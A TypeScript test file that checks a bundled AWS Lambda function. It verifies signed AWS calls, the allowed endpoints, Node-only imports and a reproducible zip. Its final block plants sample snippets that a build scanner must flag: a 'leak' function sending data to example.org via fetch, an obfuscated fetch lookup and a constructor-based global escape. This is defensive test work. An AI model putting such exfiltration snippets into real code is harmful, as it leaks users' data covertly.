import { fileURLToPath } from "node:url";
// The built function (dist/index.mjs, zipped in dist/explain.zip) runs on its
// own: real SigV4 signing and the real fetch path, with fetch stubbed to the
// fake AWS. `npm test` builds first.

import { existsSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { inflateRawSync } from "node:zlib";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { ENV, FakeAws, httpEvent } from "./helpers.js";

const dist = fileURLToPath(new URL("../dist/", import.meta.url));
const aws = new FakeAws();
const hosts: string[] = [];
const authorized: boolean[] = [];
let handler: (event: unknown) => Promise<{ statusCode: number; body: string }>;

beforeAll(async () => {
  if (!existsSync(`${dist}index.mjs`)) throw new Error("dist/ is missing: run `npm run build` (npm test builds first)");
  // Default Grok intentionally refuses live startup until its billed reasoning
  // bound is documented. Exercise the built transport with documented Sonnet.
  for (const [k, v] of Object.entries({ ...ENV, EXPLAIN_MODEL_ID: "us.anthropic.claude-sonnet-5-5", EXPLAIN_PRICE_OUT: "11.00" })) vi.stubEnv(k, v);
  vi.stubEnv("AWS_ACCESS_KEY_ID", "TESTONLYACCESSKEYID");
  vi.stubEnv("AWS_SECRET_ACCESS_KEY", "test-only-not-a-secret");
  vi.stubEnv("AWS_SESSION_TOKEN", "test-only-session");
  vi.stubGlobal("fetch", async (url: string, init: RequestInit) => {
    const u = new URL(url);
    hosts.push(u.host);
    const headers = init.headers as Record<string, string>;
    authorized.push(/^AWS4-HMAC-SHA256 Credential=TESTONLYACCESSKEYID\//.test(headers.authorization ?? "") && headers["x-amz-security-token"] === "test-only-session");
    const service = u.host.startsWith("dynamodb.") ? "dynamodb" : "bedrock";
    const reply = await aws.transport({
      service,
      host: u.host,
      method: init.method as "GET" | "POST",
      path: u.pathname,
      headers,
      body: typeof init.body === "string" ? init.body : "",
      timeoutMs: 1000,
    });
    return new Response(reply.body === "" ? null : reply.body, { status: reply.status, headers: reply.headers });
  });
  const mod = (await import(`${dist}index.mjs`)) as { handler: typeof handler };
  handler = mod.handler;
});

afterAll(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

describe("the built function", () => {
  it("answers a real request end to end, signing every AWS call", async () => {
    const r = await handler(httpEvent());
    expect(r.statusCode).toBe(200);
    expect(JSON.parse(r.body).model).toBe("Claude Sonnet 5.5");
    expect(authorized.length).toBeGreaterThan(5);
    expect(authorized.every(Boolean)).toBe(true);
  });

  it("talks to exactly three AWS endpoints in us-east-1, and nothing else", () => {
    expect([...new Set(hosts)].sort()).toEqual([
      "bedrock-runtime.us-east-1.amazonaws.com",
      "bedrock.us-east-1.amazonaws.com",
      "dynamodb.us-east-1.amazonaws.com",
    ]);
  });

  it("imports nothing but Node's own modules", () => {
    const code = readFileSync(`${dist}index.mjs`, "utf8");
    const imports = [...code.matchAll(/^import .* from "([^"]+)";$/gm)].map((m) => m[1]);
    expect(imports.every((i) => i!.startsWith("node:"))).toBe(true);
    expect(code).not.toMatch(/require\(|@aws-sdk|node_modules/);
  });

  it("zips index.mjs alone, reproducibly", () => {
    const zip = readFileSync(`${dist}explain.zip`);
    const view = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
    expect(view.getUint32(0, true)).toBe(0x04034b50);
    const nameLength = view.getUint16(26, true);
    const size = view.getUint32(18, true);
    const name = new TextDecoder().decode(zip.subarray(30, 30 + nameLength));
    expect(name).toBe("index.mjs");
    const data = inflateRawSync(zip.subarray(30 + nameLength, 30 + nameLength + size));
    const bundle = readFileSync(`${dist}index.mjs`);
    expect(data.length).toBe(bundle.length);
    expect(data.every((b, i) => b === bundle[i])).toBe(true);
    // One entry: the end record counts one file.
    expect(view.getUint16(zip.length - 22 + 10, true)).toBe(1);
    expect(readFileSync(`${dist}explain.zip.sha256`, "utf8")).toMatch(/^[0-9a-f]{64} {2}explain\.zip\n$/);
  });
});

describe("only the AWS transport can reach the network (RT2: the engine and the rule pack are bundled too)", () => {
  it("flags any other bundled file that names fetch or another way out, in code, comments or data", async () => {
    const { networkReach, NETWORK_MODULE } = await import("../scripts/build.mjs");
    const planted = [
      "export const leak = (s: string) => fetch(`https://example.org/?q=${s}`);",
      "export const leak = (s: string) => (globalThis as any)['fe' + 'tch'](s);",
      "export const x = [].constructor.constructor('return this')();",
      "import('node:https');",
      "export const s = { rules: 'node:dgram' };",
      "export const t = global['fetch'];",
    ];
    const names = planted.map((body, i) => {
      const rel = `dist/planted-${i}.ts`;
      writeFileSync(`${dist}planted-${i}.ts`, body);
      return rel;
    });
    expect(networkReach(names)).toEqual(names);
    writeFileSync(`${dist}planted-ok.ts`, "import { fetchTransport } from './x.js'; // a global inference profile\nexport const f = fetchTransport;");
    expect(networkReach(["dist/planted-ok.ts", NETWORK_MODULE])).toEqual([]);
  });

  it("finds nothing in the engine's source, the rule pack or the function's own files", async () => {
    const { networkReach } = await import("../scripts/build.mjs");
    const engine = readdirSync(`${dist}../../engine/src`).filter((f) => f.endsWith(".ts")).map((f) => `../engine/src/${f}`);
    const pack = readdirSync(`${dist}../../engine/src/generated`).map((f) => `../engine/src/generated/${f}`);
    expect(engine.length).toBeGreaterThan(3);
    expect(networkReach([...engine, ...pack, "../../rules/biasclear-rules.json", "data/moves.json", "src/index.ts", "src/app.ts"])).toEqual([]);
  });
});
